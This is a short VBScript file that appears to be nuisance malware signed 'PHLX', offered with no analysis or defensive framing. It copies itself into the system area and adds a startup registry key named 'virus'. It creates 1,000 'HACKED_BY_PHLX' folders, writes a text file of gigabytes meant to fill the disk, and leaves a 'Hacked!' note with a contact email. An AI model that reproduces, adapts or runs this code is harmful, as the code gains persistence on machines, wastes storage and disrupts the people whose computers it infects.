Set ddr = CreateObject("Scripting.FileSystemObject") 'automate startup
Set repwin = ddr.GetSpecialFolder(0)
ddr.CopyFile WScript.ScriptFullName,repwin&"\..\app2vers.vbs"
Set shell = CreateObject("WScript.Shell")
shell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\virus","C:\app2vers"
bcl=0
b=0
do while not bcl=1000 'create 1,000 folders
bcl=bcl+1
b=b+1
Set ddr = CreateObject("Scripting.FileSystemObject")
Set re = ddr.CreateFolder("C:\HACKED_BY_PHLX"&b)
loop
Set FileAccess = CreateObject("Scripting.FileSystemObject")
Set TargetFile = FileAccess.CreateTextFile("C:\PHLX.txt")
Ligne = "Hacked!"
Esp = "Send me a msg : postmaster21@hotmail.com"
do while a<10000000 '10000000=1Go -> x10=x10 of file
TargetFile.WriteLine Ligne
TargetFile.WriteLine Esp & VBCrLf
a=a+1
loop
TargetFile.Close
Set FileAccess = CreateObject("Scripting.FileSystemObject")
Set TargetFile = FileAccess.CreateTextFile("C:\PHLXFILEReadMe.txt")
Ligne = "Hacked!"
Esp = "Want More info ?? Send me a msg : postmaster21@hotmail.com"
TargetFile.WriteLine Ligne & VBCrLf & VBCrLf
TargetFile.WriteLine Esp 
TargetFile.Close